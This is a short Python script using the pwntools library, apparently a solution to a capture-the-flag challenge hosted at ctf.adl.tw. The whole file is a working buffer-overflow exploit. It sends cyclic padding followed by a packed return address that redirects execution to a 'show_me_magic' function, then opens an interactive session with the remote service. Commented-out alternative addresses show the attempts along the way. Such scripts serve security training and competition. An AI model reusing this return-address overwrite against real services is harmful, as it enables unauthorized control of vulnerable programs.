from pwn import *
import struct

print(cyclic(100))

ip = 'ctf.adl.tw'
port = 11001

r = remote(ip, port)
show_me_magic = 0x0000000000400627
# show_me_magic = 0x000000000040063c
# show_me_magic = 0x400520
# show_me_magic = 0x0b0225ff

payload = "aaaabaaacaaadaaaeaaafaaa"
payload += p64(show_me_magic)

r.send(payload)
r.interactive()

